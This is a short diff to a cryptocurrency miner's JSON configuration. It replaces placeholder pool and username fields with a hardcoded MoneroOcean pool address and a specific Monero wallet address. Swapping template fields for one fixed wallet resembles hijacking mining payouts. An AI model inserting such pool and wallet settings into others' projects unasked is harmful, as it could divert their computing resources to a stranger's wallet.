@@ -15,12 +15,23 @@
   "syslog": false,
   "threads": $threads$,
   "pools": [
-    {
-      "url": "$url$",
-      "user": "$username$",
-      "pass": "x",
-      "keepalive": true,
-      "nicehash": false
-    }
+        {
+            "algo": null,
+            "coin": null,
+            "url": "gulf.moneroocean.stream:10128",
+            "user": "43zv7QGQq9fFpaNHxMgCZRiCqdhgMN3B55FTZiGa7KNySpFZRpeGXcqVtTt5VMRBeUC6Z5e9H5tdpA77hzfg9oewLPtRXVM",
+            "pass": "x",
+            "rig-id": null,
+            "nicehash": false,
+            "keepalive": true,
+            "enabled": true,
+            "tls": false,
+            "wss": false,
+            "tls-fingerprint": null,
+            "daemon": false,
+            "socks5": null,
+            "self-select": null,
+            "submit-to-origin": false
+        }
   ]
 }
